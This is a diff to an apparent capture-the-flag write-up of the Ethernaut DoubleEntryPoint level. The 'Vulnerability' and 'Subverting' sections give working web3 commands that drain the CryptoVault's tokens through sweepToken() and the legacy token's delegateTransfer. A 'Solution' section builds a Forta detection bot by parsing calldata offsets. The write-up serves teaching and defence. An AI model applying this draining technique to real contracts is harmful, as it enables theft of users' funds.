@@ -16,12 +16,12 @@ interface DelegateERC20 {
 }
 
 interface IDetectionBot {
-    function handleTransaction(address user, bytes calldata msgData) external;
+    function handleTransaction(address user, bytes calldata data) external;
 }
 
 interface IForta {
     function setDetectionBot(address detectionBotAddress) external;
-    function notify(address user, bytes calldata msgData) external;
+    function notify(address user, bytes calldata data) external;
     function raiseAlert(address user) external;
 }
 
@@ -33,9 +33,9 @@ contract Forta is IForta {
       usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
   }
 
-  function notify(address user, bytes calldata msgData) external override {
+  function notify(address user, bytes calldata data) external override {
     if(address(usersDetectionBots[user]) == address(0)) return;
-    try usersDetectionBots[user].handleTransaction(user, msgData) {
+    try usersDetectionBots[user].handleTransaction(user, data) {
         return;
     } catch {}
   }
@@ -160,7 +160,7 @@ The `Forta` contract facilitates a transaction detection and alert system. It en
 
 - `setDetectionBot(address detectionBotAddress)`: Users can set a detection bot for their account.
 
-- `notify(address user, bytes calldata msgData)`: Notifies the associated detection bot about a user's transaction.
+- `notify(address user, bytes calldata data)`: Notifies the associated detection bot about a user's transaction.
 
 - `raiseAlert(address user)`: Allows the detection bot to raise alerts for suspicious activities.
 
@@ -216,6 +216,38 @@ The provided smart contracts form a comprehensive system for detecting and handl
 
 ## Vulnerability
 
+In the `LegacyToken` contract,  the `transfer()` function if the delegate's address is not defined, calls the ERC20 contract's transfer function. But, if it is defined, it calls the `delegateTransfer()` function from the `DoubleEntryPoint` contract without any security check. In this case, we can **call the delegateTransfer() function from any contract**. 
+
+```solidity
+function transfer(address to, uint256 value) public override returns (bool) {
+        if (address(delegate) == address(0)) {
+            return super.transfer(to, value);
+        } else {
+            return delegate.delegateTransfer(to, value, msg.sender);
+        }
+    }
+```
+
+Also, in the `CryptoVault` contract, there is a `sweepToken()` function which calls the ERC20 token's transfer() function without any security check again. If we match this information, we can **call the LegacyToken contract's transfer function from sweepToken() by sending the legacy contract's address as a parameter**. What is more, we will pass the `onlyDelegateFrom` requirement because we called this function from the Legacy contract. :D Good planning.
+
+```solidity
+ function sweepToken(IERC20 token) public {
+        require(token != underlying, "Can't transfer underlying token");
+        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
+    }
+```
+
+```solidity
+modifier onlyDelegateFrom() {
+        require(msg.sender == delegatedFrom, "Not legacy contract");
+        _;
+    }
+```
+
+In this scenario, we can drain all underlying tokens in the `CryptoVault` contract if the `sweptTokensRecipient` and `delegate` variables' values are the same. Before exploiting, we need to prove this chance. 
+
+Get the `CryptoVault` and `LegacyToken` contracts addresses.
+
 ```js
 vault = await contract.cryptoVault()
 '0x1A82fBF3aF7542B550D2850b708E6F4D423E44fa'
@@ -226,22 +258,30 @@ legacy = await contract.delegatedFrom()
 '0x009e22b7A97A80f8Fa89CE23854D4EF134F510E6'
 ```
 
+After then, get the variables values from the storage of contracts with `getStorageAt()` method.
+
 ```js
 await web3.eth.getStorageAt(vault, 1)
 '0x000000000000000000000000ce7840ab1c857db85387f39bf8e4393cbc985db0'
 ```
 
 ```js
-await web3.eth.call({from:player, to:legacy, data:'0xc89e4361'})
+await web3.eth.call({from:player, to:legacy, data:'0xc89e4361'}) // this a getter function for 'delegate'
 '0x000000000000000000000000ce7840ab1c857db85387f39bf8e4393cbc985db0'
 ```
 
+As you can see, this values are same. Time to exploit this!
+
 ## Subverting
 
+Before exploit this challenge, check the balance of `CryptoVault` contract.
+
 ```js
-await contract.balanceOf(cryptoVaultAddr).then(b => b.toString());
+await contract.balanceOf(vault).then(b => b.toString());
 '100000000000000000000'
 ```
+
+Next, let's call `sweepToken()` with encoding function's informations and legacy contract's address as a parameter to start trigger `delegateTransfer()`.
 
 ```js
 const _function = {
@@ -268,12 +308,19 @@ const data = web3.eth.abi.encodeFunctionCall(_function, param);
 await web3.eth.sendTransaction({from: player,to: vault,data: data});
 ```
 
+And, check the CryptoVault's balance again. We swept `DET` token in return all CryptoVault's balance.
+
 ```js
 await contract.balanceOf(vault).then(x => x.toString());
 '0'
 ```
 
 # Solution
+ 
+In this part, we will find a way for cut off this vulnerability. The exploit was made by calling the `sweepToken()` function of the CryptoVault contract with the LegacyToken contract as the address. Then, a message call to the `DoubleEntryPoint` contract is made for the delegateTransfer function. In our guard contract, that message's data is the one our bot will receive on `handleTransaction()` because delegateTransfer is the one with the `fortaNotify` modifier. Regarding that function, the only thing we can use for our need is the `origSender`, which will be the address of CryptoVault during a sweep. So, our bot can **check that value within the calldata and raise an alert if it is the address of** `CryptoVault`.
+
+Shortly, to prevent this problem, we must give an alert by using the `IDetectionBot` interface when the caller of the `transfer()` function is equal to `CryptoVault`'s address. Thus, the transaction will revert. Let's continue with our secure guard bot contract.
+
 
 ```solidity
 pragma solidity ^0.8.0;
@@ -305,16 +352,35 @@ contract Bot is IDetectionBot{
 }
 ```
 
+Shortly, it gets `CryptoVault`'s address in the constructor. Then, it overrides `handleTransaction()` function from the `IDetectionBot` interface. And it gets origSender's senders address from **encoded calldata** in the inline assembly. Understand the encoding rule of function parameters and use this knowledge to **get the correct data offset you want to get in calldata**.
+
+Layout of calldata when function `handleTransaction(address _user, bytes calldata data) external;` is called.
+
+|Offset|Length|Speciality|Type|Value|
+|-----------------|--------|----------------------------------------|---------|--------------------------------------------------------------------|
+|0x00|4|`handleTransaction()` function's signature|bytes4|0x220ab6aa|
+|0x04|32|`_user`|address|0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx|
+|0x24|32|`offset of data`|uint256|0x0000000000000000000000000000000000000000000000000000000000000040|
+|0x44|32|`length of data`|uint256|0x0000000000000000000000000000000000000000000000000000000000000064|
+|0x64|4|`delegateTransfer()` function's signature|bytes4|0x9cd1a121|
+|0x68|32|`to`|address|0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx|
+|0x88|32|`value`|uint256|0x0000000000000000000000000000000000000000000000056bc75e2d63100000|
+|0xA8|32|`origSender`|address|0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx|
+|0xC8|28|`padding`|bytes|0x00000000000000000000000000000000000000000000000000000000|
 
 
-
+Finally, it checks if the `origSender`'s address is same to `CryptoVault`'s address or nor. If it is same, the Forta's bot raise an alert for user's account. We have completed all goals. Let's prevent this time!
 
 Deploy the `Bot` contract. See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0x4dfe2f8b82b885e3318958c3be9c0ac3bb86912038a11e9673da23f8158e6209).
+
+To apply this bot, we should get `Forta` contract's address.
 
 ```js
 forta = await contract.forta()
 '0x5b3ddf8095BD68ebf069bD900B210BB8038EC8dD'
 ```
+
+Then, call `setDetectionBot0()` function to apply this bot with it's address.
 
 ```js
 const _function = {
@@ -347,7 +413,7 @@ const param = [bot]
 const data = web3.eth.abi.encodeFunctionCall(_function,param)
 ```
 
-See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0x79aaf0c160c96c2665173c1c0f58561644ad2817b36165d6a4a32a635a13fcf5).
+See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0x79aaf0c160c96c2665173c1c0f58561644ad2817b36165d6a4a32a635a13fcf5). We have successfully, apply our bot!
 
 ```js
 await web3.eth.sendTransaction({from: player, to:forta, data:data})
